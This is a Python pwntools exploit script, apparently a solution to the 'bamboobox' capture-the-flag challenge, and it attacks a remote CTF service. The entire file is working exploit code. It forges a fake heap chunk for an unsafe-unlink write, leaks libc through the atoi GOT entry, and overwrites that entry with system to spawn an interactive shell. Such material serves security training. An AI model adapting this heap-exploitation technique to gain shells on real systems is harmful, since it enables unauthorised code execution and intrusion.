from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = remote("csie.ctf.tw", 10138)
#r = process('./bamboobox')
#gdb.attach(proc.pidof(r)[0])

def add(size, name):
    r.sendlineafter(":", "2")
    r.sendlineafter(":", str(size))
    r.sendlineafter(":", name)

def show():
    r.sendlineafter(":", "1")

def change(idx, size, name):
    r.sendlineafter(":", "3")
    r.sendlineafter(":", str(idx))
    r.sendlineafter(":", str(size))
    r.sendlineafter(":", name)

def remove(idx):
    r.sendlineafter(":", "4")
    r.sendlineafter(":", str(idx))

add(0x80, 'A') # 0
add(0x80, 'A') # 1
add(0x80, 'A') # 2

chunk = p64(0) + p64(0x81) # prev_size, size
chunk += p64(0x6020d8 - 0x18) + p64(0x6020d8 - 0x10) # fd, bk
chunk += 'A' * 0x60
chunk += p64(0x80) + p64(0x90) # prev_size2, size2
change(1, 0x90, chunk)
remove(2)

atoi_got = 0x602068
change(1, 0x100, p64(0) + p64(atoi_got))
show()
r.recvuntil("0 : ")
libc = u64(r.recvuntil("1")[:-1].ljust(8, '\x00')) - 0x36e80
system = libc + 0x45390

change(0, 0x08, p64(system))

r.sendline("sh")

r.interactive()
